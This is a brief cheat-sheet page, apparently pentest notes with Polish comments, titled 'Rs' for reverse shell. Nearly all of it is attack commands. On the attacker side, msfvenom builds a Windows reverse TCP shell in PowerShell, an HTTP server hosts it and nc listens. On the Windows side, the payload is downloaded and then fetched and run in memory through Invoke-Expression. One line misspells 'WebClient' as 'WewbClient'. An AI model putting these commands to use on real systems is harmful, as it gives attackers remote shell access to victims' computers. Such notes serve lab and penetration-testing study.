---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Rs

**kali**

```python
#tworzymy payloada
msfvenom -p windows/x64/shell_reverse_tcp -f psh LPORT=22 LHOST=10.20.10.31 > rs.ps1

#wystawiamy payload będąc w katalogu gdzie jest stworzony plik z payloadem
python -m http.server 8081

#ustawiamy listenera
nc -nlvp 22
```

**Win**

{% code fullWidth="true" %}
```python
#kopiujemy payload
Invoke-WebRequest -uri http://10.20.10.31:8081/rs.ps1 -OutFile rs.ps1

#kopiujemy skrypt do RAM
(New-Object System.Net.WewbClient).DownloadString('http://10.20.10.31:8081/rs.ps1') | Invoke-Expression
```
{% endcode %}
